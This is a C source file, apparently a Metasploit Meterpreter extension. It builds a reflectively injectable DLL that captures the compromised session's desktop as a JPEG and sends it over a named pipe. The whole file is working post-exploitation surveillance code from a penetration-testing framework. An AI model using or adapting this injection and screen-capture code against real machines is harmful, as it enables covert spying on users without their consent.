#pragma once

#include "screenshot.h"
#include "gluons.h"
#include <wincodec.h>


// define this as we are going to be injected via RDI
#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR

// define this as we want to use our own DllMain function
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

/*
 * Take a screenshot of this sessions default input desktop on WinSta0
 * and send it as a JPEG image to a named pipe.
 */
DWORD screenshot( int quality, DWORD dwPipeName )
{
	UNREFERENCED_PARAMETER(quality);
	//OSVERSIONINFO os           = {0};
	char cNamedPipe[MAX_PATH]  = {0};

	_snprintf_s(cNamedPipe, sizeof(cNamedPipe), MAX_PATH, "\\\\.\\pipe\\%08X", dwPipeName);

	/* add code here */

	// create object
	void* msfss = MsfScreenShot_create();
	
	// get raw desktop bitmap
	MsfScreenShot_InitRawDesktop(msfss);
	
	// encode to specified format (hardcoded as jpg for testing)
	BYTE *img = NULL;
	DWORD size = 0;
	MsfScreenShot_EncodeData(msfss, &img, &size, GUID_ContainerFormatJpeg);
	
	// delete object
	MsfScreenShot_delete(msfss);
	
	/* end initial additions */

	// if we have successfully taken a screenshot we send it back via the named pipe
	// but if we have failed we send back a zero byte result to indicate this failure.
	if( size != 0 )
		MsfScreenShot_SendScreenShot( msfss, cNamedPipe, img, size );
	else
		MsfScreenShot_SendScreenShot( msfss, cNamedPipe, NULL, 0 );

	// free the jpeg images buffer
	if( img )
		free( img );

	return 0;
}

/*
 * Grab a DWORD value out of the command line.
 * e.g. screenshot_command_dword( "/FOO:0x41414141 /BAR:0xCAFEF00D", "/FOO:" ) == 0x41414141
 */
DWORD screenshot_command_dword( char * cpCommandLine, char * cpCommand )
{
	char * cpString = NULL;
	DWORD dwResult  = 0;

	do
	{
		if( !cpCommandLine || !cpCommand )
			break;
		
		cpString = strstr( cpCommandLine, cpCommand );
		if( !cpString )
			break;

		cpString += strlen( cpCommand );

		dwResult = strtoul( cpString, NULL, 0 );

	} while( 0 );

	return dwResult;
}

/*
 * Grab a int value out of the command line.
 * e.g. screenshot_command_int( "/FOO:12345 /BAR:54321", "/FOO:" ) == 12345
 */
int screenshot_command_int( char * cpCommandLine, char * cpCommand )
{
	char * cpString = NULL;
	int iResult     = 0;

	do
	{
		if( !cpCommandLine || !cpCommand )
			break;
		
		cpString = strstr( cpCommandLine, cpCommand );
		if( !cpString )
			break;

		cpString += strlen( cpCommand );

		iResult = atoi( cpString );

	} while( 0 );

	return iResult;
}

/*
 * The real entrypoint for this app.
 */
VOID screenshot_main( char * cpCommandLine )
{
	DWORD dwResult = ERROR_INVALID_PARAMETER;

	do
	{
		dprintf( "[SCREENSHOT] screenshot_main. cpCommandLine=0x%08X", (DWORD)cpCommandLine );

		if( !cpCommandLine )
			break;

		if( strlen( cpCommandLine ) == 0 )
			break;
			
		dprintf( "[SCREENSHOT] screenshot_main. lpCmdLine=%s", cpCommandLine );
		
		if( strstr( cpCommandLine, "/s" ) )
		{
			DWORD dwPipeName = 0;
			int quality      = 0;

			quality    = screenshot_command_int( cpCommandLine, "/q:" );

			dwPipeName = screenshot_command_dword( cpCommandLine, "/p:" );

			dwResult   = screenshot( quality, dwPipeName );
		}

	} while( 0 );

	dprintf( "[SCREENSHOT] screenshot_main. ExitThread dwResult=%d", dwResult );

	ExitThread( dwResult );
}

/*
 * DLL entry point. If we have been injected via RDI, lpReserved will be our command line.
 */
BOOL WINAPI DllMain( HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;

	switch( dwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			hAppInstance = hInstance;
			if( lpReserved != NULL )
				screenshot_main( (char *)lpReserved );
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }

	return bReturnValue;
}

